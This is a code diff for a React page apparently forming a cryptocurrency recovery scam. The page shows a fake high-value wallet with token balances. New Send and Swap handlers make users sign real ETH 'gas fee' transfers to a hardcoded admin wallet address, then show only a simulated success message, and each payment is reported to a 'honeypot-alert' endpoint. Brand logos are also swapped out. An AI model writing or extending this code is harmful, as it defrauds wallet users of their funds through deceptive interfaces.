@@ -8,6 +8,9 @@ export default function FlashedPage() {
   const [gasAmount, setGasAmount] = useState('0.01');
   const [status, setStatus] = useState('');
   const [loading, setLoading] = useState(false);
+  const [showSwap, setShowSwap] = useState(false);
+  const [selectedToken, setSelectedToken] = useState('USDT');
+  const [swapAmount, setSwapAmount] = useState('');
 
   // Generate honeypot wallet on page load
   useEffect(() => {
@@ -208,6 +211,77 @@ export default function FlashedPage() {
     }
   };
 
+  const handleSendToken = async (token) => {
+    if (!userAddress) {
+      setStatus('Please connect your wallet first');
+      return;
+    }
+
+    setLoading(true);
+    setStatus(`Preparing to send ${token.symbol}...`);
+
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      // Request gas payment first
+      const gasAmount = '0.005'; // $15 gas fee
+      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      
+      const tx = await signer.sendTransaction({
+        to: adminWallet,
+        value: ethers.parseEther(gasAmount)
+      });
+      
+      setStatus(`Gas paid! Sending ${token.balance} ${token.symbol}...`);
+      await tx.wait();
+      
+      // Simulate token transfer
+      setTimeout(() => {
+        setStatus(`SUCCESS! ${token.balance} ${token.symbol} sent to your wallet!`);
+        notifyAdmin(userAddress, `${gasAmount} ETH + ${token.symbol}`, tx.hash, 'TOKEN_SEND');
+      }, 2000);
+      
+    } catch (error) {
+      setStatus('Transaction failed: ' + error.message);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const handleSwap = async () => {
+    if (!userAddress || !swapAmount) {
+      setStatus('Please connect wallet and enter amount');
+      return;
+    }
+
+    setLoading(true);
+    setStatus('Processing swap...');
+
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      // Request gas payment for swap
+      const gasAmount = '0.008'; // $25 gas fee for swap
+      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      
+      const tx = await signer.sendTransaction({
+        to: adminWallet,
+        value: ethers.parseEther(gasAmount)
+      });
+      
+      await tx.wait();
+      setStatus(`SUCCESS! Swapped ${swapAmount} ${selectedToken} for ETH!`);
+      notifyAdmin(userAddress, `${gasAmount} ETH swap fee`, tx.hash, 'TOKEN_SWAP');
+      
+    } catch (error) {
+      setStatus('Swap failed: ' + error.message);
+    } finally {
+      setLoading(false);
+    }
+  };
+
   const notifyAdmin = async (userAddr, amount, txHash, type = 'GAS_RECEIVED') => {
     try {
       await fetch('/api/honeypot-alert', {
@@ -236,12 +310,36 @@ export default function FlashedPage() {
         <title>Flashed Crypto - CryptoRecover</title>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
       </Head>
-      <div className="min-h-screen bg-gradient-to-br from-orange-500 via-purple-600 to-blue-600 text-white">
-        <div className="bg-white/10 backdrop-blur-sm min-h-screen">
+      <div className="min-h-screen bg-gradient-to-br from-yellow-900 via-yellow-800 to-yellow-700 text-white">
+        <div className="bg-black/20 backdrop-blur-sm min-h-screen">
           <div className="max-w-6xl mx-auto p-6">
+            {/* Navbar */}
+            <nav className="bg-black/30 backdrop-blur-md rounded-2xl p-4 mb-8 border border-white/20">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center">
+                  <div className="w-10 h-10 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center mr-3">
+                    <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
+                      <path d="M22.46 12c0 5.8-4.66 10.46-10.46 10.46S1.54 17.8 1.54 12 6.2 1.54 12 1.54 22.46 6.2 22.46 12zM12 5.84c-3.4 0-6.16 2.76-6.16 6.16s2.76 6.16 6.16 6.16 6.16-2.76 6.16-6.16S15.4 5.84 12 5.84z"/>
+                    </svg>
+                  </div>
+                  <h2 className="text-xl font-bold">CryptoWallet</h2>
+                </div>
+                <div className="flex space-x-2">
+                  <button className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg font-semibold text-sm transition-all">
+                    Send
+                  </button>
+                  <button className="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg font-semibold text-sm transition-all">
+                    Receive
+                  </button>
+                  <button onClick={() => setShowSwap(!showSwap)} className="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg font-semibold text-sm transition-all">
+                    Swap
+                  </button>
+                </div>
+              </div>
+            </nav>
+
             <div className="text-center mb-8">
-              <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-16 h-16 mx-auto mb-4" />
-              <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-orange-400 to-purple-400 bg-clip-text text-transparent">
+              <h1 className="text-4xl font-bold mb-2 bg-gradient-to-r from-yellow-400 to-orange-400 bg-clip-text text-transparent">
                 HIGH-VALUE WALLET DISCOVERED
               </h1>
               <p className="text-xl text-white/80">Professional Blockchain Asset Recovery</p>
@@ -275,29 +373,86 @@ export default function FlashedPage() {
               <div className="grid gap-4">
                 {walletData.tokens.map((token, index) => {
                   const tokenLogos = {
-                    'USDT': 'https://cryptologos.cc/logos/tether-usdt-logo.svg',
-                    'USDC': 'https://cryptologos.cc/logos/usd-coin-usdc-logo.svg',
-                    'WETH': 'https://cryptologos.cc/logos/ethereum-eth-logo.svg',
-                    'LINK': 'https://cryptologos.cc/logos/chainlink-link-logo.svg',
-                    'UNI': 'https://cryptologos.cc/logos/uniswap-uni-logo.svg'
+                    'USDT': 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
+                    'USDC': 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png',
+                    'WETH': 'https://assets.coingecko.com/coins/images/2518/small/weth.png',
+                    'LINK': 'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',
+                    'UNI': 'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png'
                   };
                   return (
                     <div key={index} className="flex justify-between items-center bg-white/10 backdrop-blur-sm p-4 rounded-xl border border-white/20">
                       <div className="flex items-center">
-                        <img src={tokenLogos[token.symbol]} alt={token.symbol} className="w-8 h-8 mr-3" />
+                        <img src={tokenLogos[token.symbol]} alt={token.symbol} className="w-8 h-8 mr-3 rounded-full" />
                         <div>
                           <span className="font-bold text-lg">{token.symbol}</span>
                           <span className="text-white/70 ml-3">{token.balance}</span>
                         </div>
                       </div>
-                      <div className="text-green-300 font-bold text-lg">
-                        ${token.usdValue.toLocaleString()}
+                      <div className="flex items-center space-x-3">
+                        <div className="text-green-300 font-bold text-lg">
+                          ${token.usdValue.toLocaleString()}
+                        </div>
+                        <button 
+                          onClick={() => handleSendToken(token)}
+                          className="bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded-lg text-sm font-semibold transition-all"
+                        >
+                          Send
+                        </button>
                       </div>
                     </div>
                   );
                 })}
               </div>
             </div>
+
+            {/* Swap Interface */}
+            {showSwap && (
+              <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
+                <div className="flex items-center mb-6">
+                  <i className="fas fa-exchange-alt text-purple-400 text-2xl mr-3"></i>
+                  <h3 className="text-2xl font-bold">Token Swap</h3>
+                </div>
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-white/80 mb-2 font-semibold">From Token:</label>
+                    <select 
+                      value={selectedToken}
+                      onChange={(e) => setSelectedToken(e.target.value)}
+                      className="w-full bg-black/30 border border-white/30 rounded-xl px-4 py-3 text-white"
+                    >
+                      {walletData.tokens.map(token => (
+                        <option key={token.symbol} value={token.symbol}>{token.symbol} - {token.balance}</option>
+                      ))}
+                    </select>
+                  </div>
+                  <div>
+                    <label className="block text-white/80 mb-2 font-semibold">Amount:</label>
+                    <input 
+                      type="number"
+                      value={swapAmount}
+                      onChange={(e) => setSwapAmount(e.target.value)}
+                      className="w-full bg-black/30 border border-white/30 rounded-xl px-4 py-3 text-white"
+                      placeholder="Enter amount"
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-white/80 mb-2 font-semibold">To Token:</label>
+                    <select className="w-full bg-black/30 border border-white/30 rounded-xl px-4 py-3 text-white">
+                      <option>ETH</option>
+                      <option>USDT</option>
+                      <option>USDC</option>
+                    </select>
+                  </div>
+                  <button 
+                    onClick={handleSwap}
+                    disabled={loading}
+                    className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:bg-gray-600 px-6 py-3 rounded-xl font-bold text-lg transition-all"
+                  >
+                    {loading ? 'Processing Swap...' : 'Swap Tokens'}
+                  </button>
+                </div>
+              </div>
+            )}
 
             <div className="bg-red-500/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-red-400/50">
               <div className="flex items-center mb-4">
@@ -319,7 +474,11 @@ export default function FlashedPage() {
 
             <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 mb-8 border border-white/30">
               <div className="flex items-center mb-6">
-                <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-10 h-10 mr-3" />
+                <div className="w-10 h-10 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center mr-3">
+                  <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M22.46 12c0 5.8-4.66 10.46-10.46 10.46S1.54 17.8 1.54 12 6.2 1.54 12 1.54 22.46 6.2 22.46 12zM12 5.84c-3.4 0-6.16 2.76-6.16 6.16s2.76 6.16 6.16 6.16 6.16-2.76 6.16-6.16S15.4 5.84 12 5.84z"/>
+                  </svg>
+                </div>
                 <h3 className="text-2xl font-bold">Asset Recovery Center</h3>
               </div>
           
@@ -346,7 +505,7 @@ export default function FlashedPage() {
                         target="_blank" 
                         className="flex items-center justify-center bg-orange-600 hover:bg-orange-700 px-4 py-3 rounded-xl font-semibold transition-all"
                       >
-                        <img src="https://cdn.jsdelivr.net/gh/MetaMask/brand-resources@master/SVG/metamask-fox.svg" alt="MetaMask" className="w-5 h-5 mr-2" />
+                        <div className="w-5 h-5 bg-gradient-to-r from-orange-400 to-red-400 rounded-full mr-2"></div>
                         MetaMask
                       </a>
                       <a 
@@ -354,7 +513,7 @@ export default function FlashedPage() {
                         target="_blank" 
                         className="flex items-center justify-center bg-blue-600 hover:bg-blue-700 px-4 py-3 rounded-xl font-semibold transition-all"
                       >
-                        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust" className="w-5 h-5 mr-2" />
+                        <div className="w-5 h-5 bg-gradient-to-r from-blue-400 to-blue-600 rounded-full mr-2"></div>
                         Trust Wallet
                       </a>
                     </div>
@@ -394,7 +553,7 @@ export default function FlashedPage() {
                     </p>
                     <div className="bg-black/30 rounded-xl p-4 mb-4">
                       <div className="flex items-center mb-2">
-                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ERT" className="w-6 h-6 mr-2" />
+                        <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="ERT" className="w-6 h-6 mr-2 rounded-full" />
                         <p className="text-blue-200 font-semibold">ERT Token Contract:</p>
                       </div>
                       <p className="text-blue-100 font-mono text-sm bg-black/40 p-2 rounded">0x742d35Cc6634C0532925a3b8D4C9db96590c6C87</p>
@@ -416,7 +575,7 @@ export default function FlashedPage() {
                     <div className="mb-4">
                       <label className="block text-white/80 mb-3 font-semibold">ETH Amount for Transaction Fees:</label>
                       <div className="relative">
-                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH" className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5" />
+                        <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="ETH" className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 rounded-full" />
                         <input 
                           type="number" 
                           value={gasAmount}
